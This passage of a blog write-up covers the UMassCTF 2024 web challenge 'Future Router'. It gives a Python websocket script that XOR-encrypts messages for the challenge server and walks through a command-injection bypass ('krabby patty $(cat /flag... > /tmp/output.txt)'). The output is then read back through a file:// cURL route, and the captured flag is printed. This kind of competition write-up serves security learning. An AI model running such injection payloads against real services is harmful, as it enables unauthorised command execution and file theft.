+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="built_in">bytearray</span>(<span class="string">b&quot;\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">        ciphertext += <span class="built_in">chr</span>(plaintext[i] ^ SECRET_KEY[i % <span class="built_in">len</span>(SECRET_KEY)])</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&quot;hello&quot;</span></span><br><span class="line">ciphertext = xor_encrypt(plaintext.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_message</span>():</span><br><span class="line">    uri = <span class="string">&quot;ws://future-router.ctf.umasscybersec.org/app/&quot;</span></span><br><span class="line">    <span class="comment"># uri = &#x27;ws://0.0.0.0:9000/&#x27;</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(uri) <span class="keyword">as</span> websocket:</span><br><span class="line">        <span class="keyword">await</span> websocket.send(ciphertext)</span><br><span class="line">        response = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Response from server:&quot;</span>, response)</span><br><span class="line"></span><br><span class="line">asyncio.run(send_message())</span><br></pre></td></tr></table></figure>
+
+<p>And bingo we get the welcome message in response</p>
+<p><img src="/./images/umass/welcome.png" alt="welcome"></p>
+<p>Upon further analysis of the code, we discovered a command injection vulnerability triggered when sending <code>krabby patty</code> in the message. Although the code includes some filters, they can be bypassed using <code>$(test_cmd)</code>. To view the response, we redirected the output of the command injection to a file and then accessed it using the cURL functionality.</p>
+<p>Let’s proceed with the command <code>krabby patty $(ls &gt; /tmp/output.txt)</code>. The response from the websocket server matched our expectations:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response <span class="keyword">from</span> <span class="keyword">server</span>: Thank you <span class="keyword">for</span> your <span class="keyword">input</span>, we will process your request <span class="keyword">in</span> <span class="number">1</span><span class="number">-3</span> business days</span><br></pre></td></tr></table></figure>
+
+<p>Subsequently, reading the file from cURL using <code>file:///tmp/output.txt</code> yielded the desired response.</p>
+<p><img src="/./images/umass/ls.png" alt="ls"></p>
+<p>Let’s list the files of <code>/</code> using <code>krabby patty $(ls / &gt; /tmp/output.txt)</code> as input<br><img src="/./images/umass/lsroot.png" alt="lsroot"></p>
+<p>We can see the name of the flag file as <code>flag53958e73c5ba4a66</code>.</p>
+<p>We also attempted alternative approaches, such as accessing the hostname provided on the dashboard using the cURL route. However, the static source code did not provide any useful information in this regard.</p>
+<p>input &#x3D; <code>http://hostname:80/</code></p>
+<p>One example</p>
+<p><img src="/./images/umass/testing.png" alt="testing"></p>
+<h2 id="Obtaining-the-Flag"><a href="#Obtaining-the-Flag" class="headerlink" title="Obtaining the Flag"></a>Obtaining the Flag</h2><p>Now just read the file using <code>krabby patty $(cat /flag53958e73c5ba4a66 &gt; /tmp/output.txt)</code></p>
+<p><img src="/./images/umass/flag.png" alt="Flag"> </p>
+<p>Flag: <strong>UMASS{W3lC0m3_t0_Th3_FuTur3_Kr4bS_c28e1089b2}</strong></p>
+<p>Thank You</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UMassCTF-2024"><span class="toc-number">1.</span> <span class="toc-text">UMassCTF 2024</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Future-Router"><span class="toc-number">2.</span> <span class="toc-text">Web&#x2F;Future Router</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Overview"><span class="toc-number">2.1.</span> <span class="toc-text">Challenge Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Identification"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerability Identification</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-the-Flag"><span class="toc-number">2.3.</span> <span class="toc-text">Obtaining the Flag</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&text=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&is_video=false&description=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=UMassCTF 2024 Web Future Router Writeup&body=Check out this article: http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&title=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&name=UMassCTF 2024 Web Future Router Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://j4ck4l-24.github.io/2024/05/14/UMassCTF24_Writeup/&t=UMassCTF 2024 Web Future Router Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    حقوق النشر &copy;
+    
+    
+    2024
+    j4ck4l
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/j4ck4l-24">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
